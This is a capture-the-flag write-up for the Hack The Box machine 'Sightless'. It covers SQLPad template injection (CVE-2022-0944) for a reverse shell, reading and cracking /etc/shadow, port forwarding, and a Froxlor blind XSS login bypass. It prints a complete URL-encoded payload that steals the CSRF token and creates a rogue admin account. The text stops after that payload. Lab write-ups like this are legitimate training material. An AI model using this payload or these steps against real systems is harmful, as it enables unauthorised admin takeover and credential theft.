Sightless - HTB Writeup
Sightless is an easy difficulty machine although acquiring user flag was pretty straight forward 
achieved by exploiting a common CVE the root flag was much more complex involved exploiting froxlor service then locating database and offline cracking into it.
#h1 User
Nmap scan revealed http , ssh and ftp. So i started by exploroing the page.
Enumerating the page didn't lead anywhere so the only attack surface was the default page.
Scrolling down i found "Our Services" widget there were leaked the services that the machine used.
The first button at SQLPAD led me to the subdomain where the sqslpad was running.
THe other two were subtly foreshadowing the way this box is supposed to be solved "sqlpad > user > froxlor > Database > root".
Now the sqlpad was version 6.10.0 which is vulnerable to template injection marked as CVE-2022-0944. 
I found public exploit https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944 .
I setup listener ran the exploit and got connection.
Now i just grabbed password hash from shadow for user michael.
After cracking it with hashcat is can ssh into host.
This gave me the user flag.
Now to access the root classical approach like linpeas executables or kernel version wont work.
However after local service enumeration with `netstat` i discovered the service is running at port 8080 and the service being is froxlor.
I forwarded this port via ssh and connected to the service.
--note for this to work you need to add admin.sightless.htb into the /etc/hosts.
The page prompts me with login page. The froxlor has blind XSS vulnerability.
The login page can be bypassed by sending malicious code in login form that will create a new admin user with your own name and password.
To access the paylod you can go to https://github.com/advisories/GHSA-x525-54hf-xr53 and download the payload.
For this payload to work i changed the address and url encoded it so the result payload looks as followed.
`admin%7B%7B$emit.constructor%60function+b()%7Bvar+metaTag%253ddocument.querySelector('meta%5Bname%253d%22csrf-token%22%5D')%253bvar+csrfToken%253dmetaTag.getAttribute('content')%253bvar+xhr%253dnew+XMLHttpRequest()%253bvar+url%253d%22http%253a//admin.sightless.htb:8080/admin_admins.php%22%253bvar+params%253d%22new_loginname%253dabcd%2526admin_password%253dAbcd%2540%25401234%2526admin_password_suggestion%253dmgphdKecOu%2526def_language%253den%2526api_allowed%253d0%2526api_allowed%253d1%2526name%253dAbcd%2526email%253dyldrmtest%2540gmail.com%2526custom_notes%253d%2526custom_notes_show%253d0%2526ipaddress%253d-1%2526change_serversettings%253d0%2526change_serversettings%253d1%2526customers%253d0%2526customers_ul%253d1%2526customers_see_all%253d0%2526customers_see_all%253d1%2526domains%253d0%2526domains_ul%253d1%2526caneditphpsettings%253d0%2526caneditphpsettings%253d1%2526diskspace%253d0%2526diskspace_ul%253d1%2526traffic%253d0%2526traffic_ul%253d1%2526subdomains%253d0%2526subdomains_ul%253d1%2526emails%253d0%2526emails_ul%253d1%2526email_accounts%253d0%2526email_accounts_ul%253d1%2526email_forwarders%253d0%2526email_forwarders_ul%253d1%2526ftps%253d0%2526ftps_ul%253d1%2526mysqls%253d0%2526mysqls_ul%253d1%2526csrf_token%253d%22%252bcsrfToken%252b%22%2526page%253dadmins%2526action%253dadd%2526send%253dsend%22%253bxhr.open(%22POST%22,url,true)%253bxhr.setRequestHeader(%22Content-type%22,%22application/x-www-form-urlencoded%22)%253balert(%22Your+Froxlor+Application+has+been+completely+Hacked%22)%253bxhr.send(params)%7D%253ba%253db()%60()%7D%7D`
